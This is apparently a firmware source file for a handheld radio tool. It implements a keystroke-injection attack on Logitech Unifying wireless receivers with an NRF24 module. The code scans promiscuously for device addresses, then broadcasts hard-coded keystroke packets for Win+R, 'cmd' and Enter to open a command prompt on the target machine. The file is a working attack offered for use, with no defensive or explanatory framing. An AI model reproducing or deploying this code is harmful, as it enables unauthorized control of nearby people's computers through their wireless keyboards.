#include <Arduino.h>
#include "nrf_unifying.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"
#include <vector>

using namespace nrf_common;

static std::vector<std::vector<uint8_t>> discovered_uni_macs;

void perform_promiscuous_uni_scan(NRF24_MODE mode) {
    discovered_uni_macs.clear();
    tft.fillRect(10, 60, tftWidth - 20, 20, willyConfig.bgColor);
    tft.setCursor(10, 60);
    tft.println("Scanning Logitech...");

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.disableCRC();
        NRFradio.setAddressWidth(3);
        uint8_t promisc_addr[3] = {0x00, 0xAA, 0xAA};
        NRFradio.openReadingPipe(0, promisc_addr);
        NRFradio.startListening();
    }

    uint32_t scan_start = millis();
    int ch = 5;
    while(millis() - scan_start < 5000 && !check(EscPress)) {
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(ch);
            uint8_t pipe;
            if (NRFradio.available(&pipe)) {
                uint8_t buf[32];
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len >= 5) {
                    NRFradio.read(buf, len);
                    std::vector<uint8_t> mac = {buf[0], buf[1], buf[2], buf[3], buf[4]};
                    if (discovered_uni_macs.size() < 10) discovered_uni_macs.push_back(mac);
                } else {
                    NRFradio.read(buf, len);
                }
            }
            ch += 3;
            if (ch > 80) ch = 5;
        }
        vTaskDelay(10);
    }

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.stopListening();
        NRFradio.setAddressWidth(5);
        NRFradio.setCRCLength(RF24_CRC_16);
    }
}

void nrf_unifying_exploit() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("Unifying Exploit");
    tft.setTextSize(FP);

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.setPALevel(RF24_PA_MAX);
        NRFradio.setDataRate(RF24_2MBPS); // Unifying uses 2mbps
        NRFradio.setPayloadSize(22);      // Standard unifying packet length usually 22
    }

    perform_promiscuous_uni_scan(mode);

    if (discovered_uni_macs.empty()) {
        displayError("Logitech nao encontrado");
        vTaskDelay(2000 / portTICK_PERIOD_MS);
        return;
    }

    tft.fillRect(10, 60, tftWidth - 20, 40, willyConfig.bgColor);
    tft.setCursor(10, 60);
    tft.printf("Targets found: %u\n", (unsigned int)discovered_uni_macs.size());
    tft.println("Broadcasting exploit...");

    int current_channel = 5;
    size_t current_addr_idx = 0;
    uint32_t attempts = 0;

    // Sequence of payloads (e.g. GUI+R, cmd, Enter)
    uint8_t payloads[][22] = {
        {0x00, 0xC1, 0x08, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // GUI + R
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // 'c'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // 'm'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // 'd'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}  // Enter
    };

    uint32_t start_time = millis();
    int payload_idx = 0;
    while (!check(EscPress) && (millis() - start_time < 60000)) {
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(current_channel);

            NRFradio.openWritingPipe(discovered_uni_macs[current_addr_idx].data());

            bool success = NRFradio.write(payloads[payload_idx], 22);
            if (success) {
                attempts++;
                payload_idx = (payload_idx + 1) % 5;
            }

            current_channel += 3;
            if (current_channel > 80) {
                current_channel = 5;
                current_addr_idx = (current_addr_idx + 1) % discovered_uni_macs.size();
            }

            if (attempts % 10 == 0 && success) {
                tft.fillRect(10, 100, tftWidth - 20, 20, willyConfig.bgColor);
                tft.setCursor(10, 100);
                tft.printf("Payloads sent: %d", attempts);
            }
        }

        if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
            NRFSerial.println("UNI_EXPLOIT_" + String(current_channel));
        }

        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) NRFSerial.println("OFF");
}
